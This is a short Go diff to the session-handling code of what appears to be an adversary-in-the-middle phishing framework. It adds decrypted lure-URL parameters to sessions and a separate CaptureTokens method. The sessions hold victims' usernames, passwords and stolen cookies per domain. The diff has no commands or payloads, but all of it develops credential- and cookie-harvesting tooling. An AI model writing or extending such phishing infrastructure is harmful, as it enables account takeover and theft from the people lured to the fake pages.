@@ -45,6 +45,7 @@ type Session struct {
 	Username     string
 	Password     string
 	Custom       map[string]string
+	LureParams   map[string]string                  // decrypted params from the ?p= lure URL token
 	CookieTokens map[string]map[string]*http.Cookie // domain → name → cookie
 	BodyTokens   map[string]string
 	HTTPTokens   map[string]string
@@ -229,6 +230,10 @@ func (s *SessionService) Complete(session *Session) error {
 }
 
 func (s *SessionService) Update(session *Session) error {
+	return s.Store.UpdateSession(session)
+}
+
+func (s *SessionService) CaptureTokens(session *Session) error {
 	if err := s.Store.UpdateSession(session); err != nil {
 		return err
 	}
@@ -267,7 +272,8 @@ func (s *SessionService) Delete(id string) error {
 }
 
 // NewSession creates a new session and persists it to the store.
-func (s *SessionService) NewSession(clientIP, ja4Hash, userAgent, lureID, phishletName string) (*Session, error) {
+// lureParams are optional key-value pairs decrypted from the lure URL's ?p= token.
+func (s *SessionService) NewSession(clientIP, ja4Hash, userAgent, lureID, phishletName string, lureParams map[string]string) (*Session, error) {
 	sess := &Session{
 		ID:         uuid.New().String(),
 		RemoteAddr: clientIP,
@@ -275,6 +281,7 @@ func (s *SessionService) NewSession(clientIP, ja4Hash, userAgent, lureID, phishl
 		UserAgent:  userAgent,
 		LureID:     lureID,
 		Phishlet:   phishletName,
+		LureParams: lureParams,
 		StartedAt:  time.Now(),
 	}
 
